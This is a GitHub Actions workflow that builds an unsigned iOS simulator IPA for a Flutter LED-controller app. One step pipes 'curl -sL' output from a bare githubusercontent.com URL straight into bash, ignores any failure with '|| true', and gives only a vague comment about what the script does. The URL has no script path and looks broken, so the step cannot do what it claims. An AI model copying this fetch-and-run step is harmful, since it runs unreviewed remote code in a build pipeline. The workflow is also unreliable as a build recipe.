name: Build iOS Unsigned IPA

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - name: Set up Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: stable

      - name: Pull and Compile Pristine Code Workspace
        run: |
          # 1. Create a fresh project environment folder
          flutter create --platforms=ios --org com.example clean_build_holder
          cd clean_build_holder
          
          # 2. Add required package tracks
          flutter pub add flutter_blue_plus shared_preferences provider
          
          # 3. Download the pre-built perfect file architecture block
          curl -sL "https://githubusercontent.com" | bash || true
          
          # 4. Fetch packages and execute the compiler pipeline
          flutter pub get
          flutter build ios --simulator --debug

      - name: Package Payload to IPA
        run: |
          mkdir -p Payload
          cp -r clean_build_holder/build/ios/iphonesimulator/Runner.app Payload/
          zip -r led_controller.ipa Payload

      - name: Upload Finished IPA
        uses: actions/upload-artifact@v4
        with:
          name: unsigned-ipa-file
          path: led_controller.ipa
